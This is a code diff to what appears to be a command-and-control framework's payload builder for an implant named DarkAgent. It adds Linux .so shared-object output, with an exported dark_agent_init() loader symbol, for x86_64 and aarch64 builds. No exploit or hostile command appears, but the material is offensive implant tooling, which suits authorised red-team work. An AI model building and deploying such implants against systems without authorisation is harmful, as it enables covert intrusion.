@@ -86,8 +86,8 @@ class DarkAgent(PayloadType):
         BuildParameter(
             name="output_format",
             parameter_type=BuildParameterType.ChooseOne,
-            description="Output format: 'bin' produces a standalone executable, 'dylib' produces a macOS dynamic library with an exported dark_agent_init() function.",
-            choices=["bin", "dylib"],
+            description="Output format: 'bin' produces a standalone executable, 'dylib' produces a macOS dynamic library (.dylib), 'so' produces a Linux shared object (.so). Both dylib and so export a dark_agent_init() function for dlopen-based loading.",
+            choices=["bin", "dylib", "so"],
             default_value="bin",
             required=False,
             group_name="Build Options"
@@ -239,10 +239,15 @@ class DarkAgent(PayloadType):
         ARCHITECTURE = self.get_parameter("architecture")
         IS_MACOS = self.selected_os == "macOS"
         IS_DYLIB = OUTPUT_FORMAT == "dylib"
+        IS_SO = OUTPUT_FORMAT == "so"
 
         if IS_DYLIB and not IS_MACOS:
             resp.set_status(BuildStatus.Error)
             resp.build_message = "dylib output format is only supported for macOS builds"
+            return resp
+        if IS_SO and IS_MACOS:
+            resp.set_status(BuildStatus.Error)
+            resp.build_message = "so output format is only supported for Linux builds. Use 'dylib' for macOS."
             return resp
         tmp = tempfile.TemporaryDirectory(suffix=self.uuid)
         agent_build_path = Path(tmp.name)
@@ -508,6 +513,26 @@ class DarkAgent(PayloadType):
                     build_cmd.extend(["-p", profile_name, "-l"])
                     output_file = agent_build_path / "output/dark-agent-macos.dylib"
                 binary_type = "Mach-O dylib"
+            elif IS_SO and ARCHITECTURE == "aarch64":
+                # Linux aarch64 .so cross-compile via Crystal + Zig.
+                # Produces a .so with exported dark_agent_init() symbol.
+                if DEBUG_MODE:
+                    build_cmd.extend(["-p", profile_name, "-N"])
+                    output_file = agent_build_path / "output/dark-agent-linux-aarch64-debug.so"
+                else:
+                    build_cmd.extend(["-p", profile_name, "-n"])
+                    output_file = agent_build_path / "output/dark-agent-linux-aarch64.so"
+                binary_type = "ELF shared object (aarch64)"
+            elif IS_SO:
+                # Linux x86_64 native .so build.
+                # Produces a .so with exported dark_agent_init() symbol.
+                if DEBUG_MODE:
+                    build_cmd.extend(["-p", profile_name, "-G"])
+                    output_file = agent_build_path / "output/dark-agent-debug.so"
+                else:
+                    build_cmd.extend(["-p", profile_name, "-g"])
+                    output_file = agent_build_path / "output/dark-agent.so"
+                binary_type = "ELF shared object"
             elif IS_MACOS:
                 # macOS cross-compile via Crystal + Zig.
                 # OpenSSL is statically linked for both platforms with no runtime libssl dependency.
@@ -565,7 +590,12 @@ class DarkAgent(PayloadType):
                     StepSuccess=True
                 ))
 
-                self.file_extension = "dylib" if IS_DYLIB else "bin"
+                if IS_DYLIB:
+                    self.file_extension = "dylib"
+                elif IS_SO:
+                    self.file_extension = "so"
+                else:
+                    self.file_extension = "bin"
                 resp.status = BuildStatus.Success
                 resp.payload = open(output_file, 'rb').read()
                 encryption_status = "encryption enabled" if ENCRYPTION else "ENCRYPTION DISABLED"
